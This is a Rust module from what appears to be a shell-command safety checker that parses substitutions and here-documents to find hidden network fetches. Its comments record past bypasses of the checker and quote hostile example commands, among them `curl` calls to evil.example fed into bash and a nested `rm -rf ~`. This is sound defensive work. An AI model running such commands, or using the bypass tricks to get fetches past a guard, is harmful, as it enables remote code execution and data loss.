/// Every `<(...)` (input process-substitution) payload's inner command text
/// found in `stage`, in order, depth-tracked so a nested `(...)` inside the
/// payload (`<(curl $(echo url))`) extracts the whole inner text rather than
/// stopping at its first `)`. An unterminated `<(` (no matching `)`) yields
/// nothing further — the safe direction, since an unbalanced substitution
/// means the shell would not run it as written either.
pub(super) fn process_substitution_payloads(stage: &str) -> Vec<String> {
    paren_marker_payloads(stage, b'<')
}

/// The construct [`scan_balanced`] is currently looking for the end of.
/// `DoubleQuote`/`Backtick`/`Paren` each have their own closing character;
/// the scan itself decides (via the `match c` below) when a NEW nested
/// construct opens and recurses with the matching `Stop` for it.
#[derive(Clone, Copy, PartialEq, Eq)]
pub(super) enum Stop {
    /// Looking for the `"` that closes a double-quoted region.
    DoubleQuote,
    /// Looking for the `` ` `` that closes a backtick command substitution.
    Backtick,
    /// Looking for the `)` that closes a `$(...)`/`<(...)`/bare `(...)`
    /// region (the caller has already consumed the opening `(`).
    Paren,
}

/// Recursion cap for [`scan_balanced`] — a maliciously deep nest of
/// quotes/substitutions/subshells cannot blow the stack. Mirrors
/// `MAX_SHELL_DEPTH`'s role elsewhere in this file (bounding a different
/// kind of recursion — verdict-tree depth, not this text scan) for the same
/// reason: exceeding it yields `None` (unterminated), the same safe
/// direction every other extractor failure in this file takes — the
/// construct is deemed not to end within the input, so callers treat it as
/// absent/unterminated rather than guessing a location.
pub(super) const MAX_QUOTE_PAREN_DEPTH: usize = 64;

/// Single shared quote-AND-paren-aware balanced scan behind both
/// [`double_quoted_operand_end`] and [`paren_marker_payloads`] (and, through
/// it, [`process_substitution_payloads`]/[`dollar_paren_payloads`]). Scans
/// `chars` from `start`, which is already INSIDE the construct named by
/// `stop`, and returns the index of that construct's own closer — a bare
/// `(`/`$(`/`` ` ``/`"` encountered along the way opens a FRESH nested
/// construct that is itself scanned recursively (with its own `Stop`) and
/// skipped as a single unit before the outer scan continues, exactly the way
/// a real shell parses each quoting/substitution level as its own context.
///
/// This is what makes the scan quote-AWARE at every depth, not just the
/// outermost one: a `)` that appears inside a quoted string NESTED inside a
/// `$(...)` no longer decrements that `$(...)`'s own paren depth, because by
/// the time the scan reaches it the quoted string has already been consumed
/// whole by a recursive `Stop::DoubleQuote`/`Stop::SingleQuote`-equivalent
/// call. (Verified bypass this closes: the PREVIOUS version of this
/// depth-count, once inside a `$(...)`/backtick region, counted every bare
/// `(`/`)` generically without regard to quoting — the exact simplification
/// this doc comment used to warn about — so
/// `bash <<<"$(true ")" && curl evil)"` had its OWN embedded `)` inside the
/// quoted `")"` close the `$(...)` depth early, truncating the extracted
/// operand to `true ")"` and silently dropping the `&& curl evil)` tail —
/// including the fetch — from every downstream scan. Both the here-string
/// and process-substitution extractors funnel through this one scan, so the
/// fix closes both constructs at once rather than needing a per-syntax
/// patch.)
///
/// Single-quoted regions are handled inline (not via a `Stop` variant)
/// because nothing nests inside them: real bash treats everything between a
/// pair of `'` as completely literal, including `$(`, `` ` ``, `"`, and `(`,
/// so a single-quoted span is skipped to its own closing `'` with no
/// recursion and no backslash-escape handling (a backslash inside single
/// quotes is itself literal). A backslash outside single quotes escapes the
/// next character (consistent with the rest of this file's extractors) and
/// so never opens/closes anything.
///
/// Critically, a `'` only OPENS a single-quoted region when `stop !=
/// Stop::DoubleQuote` — i.e. at the top level and inside `$(...)`/`<(...)`/
/// backtick (each its own fresh command-line parse context, same rule as a
/// bare shell prompt), but NOT inside a double-quoted region: real bash
/// treats `'` as an ordinary literal character inside `"..."`, it does not
/// begin a single-quoted span there. Getting this backwards was a verified
/// regression: treating `'` as a quote-opener unconditionally made an
/// ordinary apostrophe inside a double-quoted here-string operand
/// (`bash <<<"it's a $(curl evil)"`) hunt for a closing `'` that never
/// comes, consuming the operand's real closing `"` — and the `$(...)` fetch
/// sitting right after it — while searching, so the scan returned an
/// unbalanced/`None` end and hid the fetch from every downstream check
/// (`bash <<<"it's a $(curl http://evil.example/x)"` and
/// `bash <<<"a'b $(curl)"` were both measured ALLOW). Reachability confirmed:
/// a mirror `$(touch marker)` in the same position actually ran, since
/// here-string command substitution happens during ordinary word expansion
/// regardless of the stray apostrophe.
///
/// An unterminated quote or substitution (the input ends before `stop`'s own
/// closer, or without a matching `'`) yields `None` — the same safe
/// direction every other extractor in this file takes: an unbalanced
/// construct is one a real shell would not run as written either, so
/// nothing further is asserted about it.
///
/// This is the EXTRACTION scan: [`scan_balanced_strict`] when that finds an
/// end, otherwise the pre-here-document scan (quotes and parens only, as this
/// function always was). Its callers extract a body to JUDGE it or keep it in
/// one segment, so the fallback is the restrictive side for them: a
/// substitution the strict scan cannot vouch for (an unterminated or expanding
/// here-document body, see below) still has its text extracted and analysed,
/// exactly as before here-documents were modelled, instead of dropping out of
/// every downstream rule. A caller that must PROVE a substitution closed
/// before it may Allow (the whole-tree-staging argv reader) uses
/// [`scan_balanced_strict`] directly.
pub(super) fn scan_balanced(
    chars: &[char],
    start: usize,
    stop: Stop,
    depth: usize,
) -> Option<usize> {
    scan_balanced_strict(chars, start, stop, depth)
        .or_else(|| scan_balanced_ctx(chars, start, stop, depth, false, false))
}

/// [`scan_balanced`]'s here-document-aware scan, which never guesses.
///
/// HERE-DOCUMENTS inside a `Stop::Paren` command context (`$(cat <<'EOF'` …
/// `EOF` … `)`) are modelled the way bash reads them, because their body is
/// DATA: an apostrophe in it (`don't`) is not a quote, and a `)` in it does
/// not close anything. On `<<` / `<<-` (not the `<<<` here-string) the
/// delimiter word is read ([`here_doc_delimiter`]); the rest of that line is
/// still scanned as code, and at the line's newline every pending body is
/// skipped, in order, up to a line EXACTLY equal to its delimiter (`<<-`:
/// after stripping leading TABS only). Everything not provably that shape is
/// `None` (unclosed — the caller's Ask side), never a guessed end:
///
/// * a body with no terminator line (bash would read on to end of input; the
///   substitution's `)` is inside the body, so nothing closes it),
/// * a delimiter that cannot be read (empty, unterminated quote, `$`/`` ` ``
///   in it, a newline inside its quotes),
/// * an UNQUOTED delimiter whose body holds `$`, `` ` `` or `\` — that body
///   is expanded (command substitution runs), so it is not plain data and
///   skipping it would hide code,
/// * the frame's closer, or a nested construct spanning a newline, reached
///   while a body is still pending (bash's line-reading there is not
///   modelled),
/// * a `<<` inside a `Stop::Backtick` body (backtick bodies are
///   backslash-processed before bash parses them; not modelled).
///
/// `$((…))` is arithmetic, where `<<` is a left shift: no here-document is
/// recognised inside it (the pre-modelling scan, which is what it always was).
pub(super) fn scan_balanced_strict(
    chars: &[char],
    start: usize,
    stop: Stop,
    depth: usize,
) -> Option<usize> {
    // A caller scanning the body of `$((…))` starts at its inner `(`.
    let arithmetic = stop == Stop::Paren
        && start >= 2
        && chars[start - 2] == '$'
        && chars[start - 1] == '('
        && chars.get(start) == Some(&'(');
    scan_balanced_ctx(chars, start, stop, depth, true, arithmetic)
}

/// One here-document whose body is still to be read: the delimiter, whether
/// `<<-` was used (strip leading TABS from the terminator line) and whether
/// the delimiter was quoted (the body is then not expanded).
struct PendingHereDoc {
    delimiter: Vec<char>,
    strips_tabs: bool,
    quoted: bool,
}

/// Read the here-document delimiter word that starts at `chars[i]` (just past
/// `<<` / `<<-`). Returns the pending body description and the index just
/// past the word, or `None` when the word cannot be read with certainty.
fn here_doc_delimiter(
    chars: &[char],
    mut i: usize,
    strips_tabs: bool,
) -> Option<(PendingHereDoc, usize)> {
    while matches!(chars.get(i), Some(' ' | '\t')) {
        i += 1;
    }
    let mut delimiter = Vec::new();
    let mut quoted = false;
    while let Some(&ch) = chars.get(i) {
        match ch {
            '\'' | '"' => {
                quoted = true;
                let close = chars[i + 1..].iter().position(|&c| c == ch)? + i + 1;
                let inner = &chars[i + 1..close];
                if inner.iter().any(|&c| matches!(c, '\n' | '$' | '`' | '\\')) {
                    return None;
                }
                delimiter.extend_from_slice(inner);
                i = close + 1;
            }
            '\\' => {
                quoted = true;
                let esc = *chars.get(i + 1)?;
                if esc == '\n' {
                    return None;
                }
                delimiter.push(esc);
                i += 2;
            }
            '$' | '`' => return None,
            c if c.is_whitespace() || matches!(c, ';' | '|' | '&' | '<' | '>' | '(' | ')') => break,
            c => {
                delimiter.push(c);
                i += 1;
            }
        }
    }
    if delimiter.is_empty() {
        return None;
    }
    Some((
        PendingHereDoc {
            delimiter,
            strips_tabs,
            quoted,
        },
        i,
    ))
}

/// Skip the bodies of `pending`, in order, starting at `chars[pos]` (the
/// first character of the line after the opener line). Returns the index of
/// the first character after the last terminator line, or `None` when any
/// body is unterminated or not provably plain data (see [`scan_balanced`]).
fn skip_here_doc_bodies(
    chars: &[char],
    mut pos: usize,
    pending: &[PendingHereDoc],
) -> Option<usize> {
    for doc in pending {
        loop {
            if pos >= chars.len() {
                return None;
            }
            let line_end = chars[pos..]
                .iter()
                .position(|&c| c == '\n')
                .map_or(chars.len(), |p| pos + p);
            let line = &chars[pos..line_end];
            let candidate = if doc.strips_tabs {
                let tabs = line.iter().take_while(|&&c| c == '\t').count();
                &line[tabs..]
            } else {
                line
            };
            if candidate == doc.delimiter.as_slice() {
                pos = line_end + 1;
                break;
            }
            if !doc.quoted && line.iter().any(|&c| matches!(c, '$' | '`' | '\\')) {
                return None;
            }
            pos = line_end + 1;
        }
    }
    Some(pos.min(chars.len()))
}

/// The scan behind [`scan_balanced`] and [`scan_balanced_strict`]. `model`
/// turns here-document modelling on for the whole scan (false is the
/// pre-modelling scan, recursively); `arithmetic` is set for the body of
/// `$((…))`, where `<<` is a shift operator rather than a here-document.
fn scan_balanced_ctx(
    chars: &[char],
    start: usize,
    stop: Stop,
    depth: usize,
    model: bool,
    arithmetic: bool,
) -> Option<usize> {
    if depth >= MAX_QUOTE_PAREN_DEPTH {
        return None;
    }
    let mut pending: Vec<PendingHereDoc> = Vec::new();
    // A nested construct `[from, to]` skipped while a body is pending must not
    // span a newline: where bash starts reading the body then is not modelled.
    let spans_newline =
        |from: usize, to: usize| chars[from..=to.min(chars.len() - 1)].contains(&'\n');
    let mut k = start;
    while k < chars.len() {
        let c = chars[k];
        if c == '\\' && k + 1 < chars.len() {
            k += 2;
            continue;
        }
        match (stop, c) {
            (Stop::DoubleQuote, '"') | (Stop::Backtick, '`') | (Stop::Paren, ')') => {
                if !pending.is_empty() {
                    return None;
                }
                return Some(k);
            }
            _ => {}
        }
        if model
            && stop != Stop::DoubleQuote
            && !arithmetic
            && c == '<'
            && chars.get(k + 1) == Some(&'<')
        {
            if chars.get(k + 2) == Some(&'<') {
                k += 3;
                continue;
            }
            if stop == Stop::Backtick {
                return None;
            }
            let strips_tabs = chars.get(k + 2) == Some(&'-');
            let word_start = k + 2 + usize::from(strips_tabs);
            let (doc, after) = here_doc_delimiter(chars, word_start, strips_tabs)?;
            pending.push(doc);
            k = after;
            continue;
        }
        if c == '\n' && !pending.is_empty() {
            k = skip_here_doc_bodies(chars, k + 1, &pending)?;
            pending.clear();
            continue;
        }
        let nested_from = k;
        match c {
            '\'' if stop != Stop::DoubleQuote => {
                // A `'` opens a single-quoted LITERAL region everywhere
                // EXCEPT inside a double-quoted region: real bash treats `'`
                // as an ordinary character inside `"..."` (it does not start
                // a single-quoted span there), but it DOES start one at the
                // top level and inside `$(...)`/`<(...)`/backtick — those
                // are fresh command-line parse contexts, same as a bare
                // shell prompt. Getting this backwards is exactly the
                // regression this guard exists to prevent: treating `'`
                // as a quote-opener UNCONDITIONALLY made an ordinary
                // apostrophe inside a double-quoted here-string operand
                // (`bash <<<"it's a $(curl evil)"`) hunt for a closing `'`
                // that never comes, consuming the operand's real closing
                // `"` (and the `$(...)` fetch after it) while searching —
                // returning `None`/an unbalanced end and hiding the fetch
                // from every downstream check (verified reachable: a
                // mirror `$(touch marker)` in the same position actually
                // ran, since here-string command substitution happens
                // during ordinary word expansion regardless of the stray
                // apostrophe).
                let mut j = k + 1;
                while j < chars.len() && chars[j] != '\'' {
                    j += 1;
                }
                if j >= chars.len() {
                    return None;
                }
                k = j + 1;
            }
            '"' => {
                let end =
                    scan_balanced_ctx(chars, k + 1, Stop::DoubleQuote, depth + 1, model, false)?;
                k = end + 1;
            }
            '`' => {
                let end = scan_balanced_ctx(chars, k + 1, Stop::Backtick, depth + 1, model, false)?;
                k = end + 1;
            }
            '$' if chars.get(k + 1) == Some(&'(') => {
                let arith = chars.get(k + 2) == Some(&'(');
                let end = scan_balanced_ctx(chars, k + 2, Stop::Paren, depth + 1, model, arith)?;
                k = end + 1;
            }
            '(' => {
                let end =
                    scan_balanced_ctx(chars, k + 1, Stop::Paren, depth + 1, model, arithmetic)?;
                k = end + 1;
            }
            _ => {
                k += 1;
                continue;
            }
        }
        if !pending.is_empty() && spans_newline(nested_from, k - 1) {
            return None;
        }
    }
    None
}

/// Shared quote-AND-paren-aware bracket extraction (via [`scan_balanced`])
/// behind [`process_substitution_payloads`] (marker `<(`) and
/// [`dollar_paren_payloads`] (marker `$(`): every occurrence of `marker`
/// immediately followed by `(` in `stage`, in order, with a nested `(...)`
/// OR a quoted string (however deeply either nests) inside the payload
/// extending the match past its first bare `)` rather than stopping there —
/// only a `)` that is not inside any nested quote/substitution ends the
/// payload. An unterminated marker (no matching `)`) yields nothing
/// further — the safe direction, since an unbalanced substitution means the
/// shell would not run it as written either.
pub(super) fn paren_marker_payloads(stage: &str, marker: u8) -> Vec<String> {
    let marker = marker as char;
    let chars: Vec<char> = stage.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i + 1 < chars.len() {
        if chars[i] == marker && chars[i + 1] == '(' {
            let start = i + 2;
            match scan_balanced(&chars, start, Stop::Paren, 0) {
                Some(end) => {
                    out.push(chars[start..end].iter().collect());
                    i = end + 1;
                    continue;
                }
                None => break,
            }
        }
        i += 1;
    }
    out
}

/// Every `$(...)` (dollar-paren command-substitution) payload's inner command
/// text found in `stage`, extracted with the same depth-tracked matching as
/// [`process_substitution_payloads`] (via the shared [`paren_marker_payloads`]),
/// so a nested `(...)` inside the payload extracts the whole inner text rather
/// than stopping at its first `)`.
pub(super) fn dollar_paren_payloads(stage: &str) -> Vec<String> {
    paren_marker_payloads(stage, b'$')
}

/// Every backtick command-substitution payload's inner text found in `stage`.
/// Backticks do not nest (a literal backtick inside a backtick body must be
/// escaped `` \` `` to mean anything else there), so this simply matches to
/// the NEXT backtick rather than depth-tracking parens; an unterminated
/// backtick (no closing partner) yields nothing further, the same safe
/// direction the other extractors take.
pub(super) fn backtick_payloads(stage: &str) -> Vec<String> {
    let bytes = stage.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'`' {
            let start = i + 1;
            let mut j = start;
            while j < bytes.len() && bytes[j] != b'`' {
                j += 1;
            }
            if j < bytes.len() {
                out.push(stage[start..j].to_string());
                i = j + 1;
                continue;
            }
            break;
        }
        i += 1;
    }
    out
}

/// Every command-substitution body in `seg` that the shell will actually RUN,
/// in source order: `$(...)` and backtick bodies at the top level or inside
/// double quotes, but NOT inside single quotes (`'$(rm x)'` is literal text).
/// `$((...))` arithmetic is a `$(` too and is returned like the rest; its
/// body is an expression, which the analyser finds nothing destructive in.
///
/// Unlike [`command_substitution_payloads`] (used by the fetch/decode egress
/// scans, where over-reporting a single-quoted body is harmless) this one
/// feeds the FULL rule engine, so literal single-quoted text must not be
/// mistaken for code. Each body is found with [`scan_balanced`], so quoting
/// and nesting inside the body cannot end it early. An unterminated
/// substitution ends the scan: [`split_segments`] keeps a CLOSED `$(a; b)` in
/// one segment (see [`closed_substitution_end`]) but cuts an unclosed one
/// apart, and those pieces are analysed as segments of their own.
pub(super) fn executed_substitution_payloads(seg: &str) -> Vec<String> {
    let chars: Vec<char> = seg.chars().collect();
    let mut out = Vec::new();
    let mut in_double = false;
    let mut k = 0;
    while k < chars.len() {
        match chars[k] {
            '\\' => {
                k += 2;
                continue;
            }
            '\'' if !in_double => {
                let mut j = k + 1;
                while j < chars.len() && chars[j] != '\'' {
                    j += 1;
                }
                k = j + 1;
                continue;
            }
            '"' => in_double = !in_double,
            '$' if chars.get(k + 1) == Some(&'(') => {
                let Some(end) = scan_balanced(&chars, k + 2, Stop::Paren, 0) else {
                    break;
                };
                out.push(chars[k + 2..end].iter().collect());
                k = end + 1;
                continue;
            }
            '`' => {
                let Some(end) = scan_balanced(&chars, k + 1, Stop::Backtick, 0) else {
                    break;
                };
                out.push(backtick_body_as_run(&chars[k + 1..end]));
                k = end + 1;
                continue;
            }
            _ => {}
        }
        k += 1;
    }
    out
}

/// The command text bash actually runs for a backtick body: inside backticks
/// a backslash followed by `` ` ``, `$` or `\` is removed before the body is
/// parsed, so `` `echo \`rm -rf ~\`` `` runs `` echo `rm -rf ~` `` — a NESTED
/// substitution. Passing the body through with its `` \` `` intact hid that
/// inner command: the analyser read `` \` `` as an escaped, literal backtick
/// and allowed it. Any other backslash is kept, as bash keeps it.
pub(super) fn backtick_body_as_run(body: &[char]) -> String {
    let mut out = String::with_capacity(body.len());
    let mut k = 0;
    while k < body.len() {
        if body[k] == '\\' && matches!(body.get(k + 1), Some('`' | '$' | '\\')) {
            out.push(body[k + 1]);
            k += 2;
            continue;
        }
        out.push(body[k]);
        k += 1;
    }
    out
}

/// Every command-substitution payload — both the `$(...)` dollar-paren form
/// and the backtick form — found in `stage`, in source order. A shell always
/// executes a `$(...)`/backtick body to produce its substituted text, exactly
/// as it forks a `<(...)` body to produce a process substitution's fd bytes,
/// so hiding a fetch behind either command-substitution spelling is not a way
/// to dodge [`scan_body_for_fetch_or_decode`]'s rule (verified bypass: a
/// process-substitution body scan that recursed only through nested `<(...)`
/// missed `bash <(echo "$(curl evil)")` and the backtick-quoted twin
/// entirely, both of which stayed Allow).
pub(super) fn command_substitution_payloads(stage: &str) -> Vec<String> {
    let mut out = dollar_paren_payloads(stage);
    out.extend(backtick_payloads(stage));
    out
}
